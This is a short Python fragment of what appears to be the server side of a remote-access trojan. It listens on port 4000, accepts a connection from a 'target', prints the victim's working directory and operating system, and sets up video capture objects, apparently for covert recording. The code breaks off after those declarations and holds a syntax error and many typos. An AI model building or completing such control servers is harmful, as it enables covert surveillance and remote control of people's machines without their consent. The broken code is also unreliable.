# First ti import all of the modules
import socket # For network (client-side) communication
import cv2 # Fopr video recording
import signal #For handling the ctrl + ccommand when exiting the program
import threading # Fpor running the vodeo rcording in a seperate thread
import numpy as np # For working woth video Frames

SERVER_HOST = "0.0.0.0" # Bind the server to all availabale network interfaces
SERVER_PORT = 4000 # 
BUFFER_SIZE = 1024 * 128 # 128KM max size of messages. This rate can be adjusted as desired

# Seperator String For Sending Two Messages At A Time
SEPARATOR = "<sep>"




# Create the socket object
s = socket.socket()
# Bind the to all IP addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))
# Make the prt reusable
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDRm 1)
# Set the maximum number of queued connections to 5
s.listen(5)
print(f"Listening as {SERVER_HOST} on port {SERVER_PORT}...")
# Accept any connections attemoted
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")
# Receive the current working directory and os of the target (client).
cwd = client_socket.recv(BUFFER_SIZE).decode()
targets_os = client_socket.recv(BUFFER_SIZE).decode()
# Print the info received.
print("[+] Current working directory: ", cwd)
print("[+] Target's Operating system: ", targets_os)
# Set up the video capture and writer.
cap = None
out = None
recording_thread = None
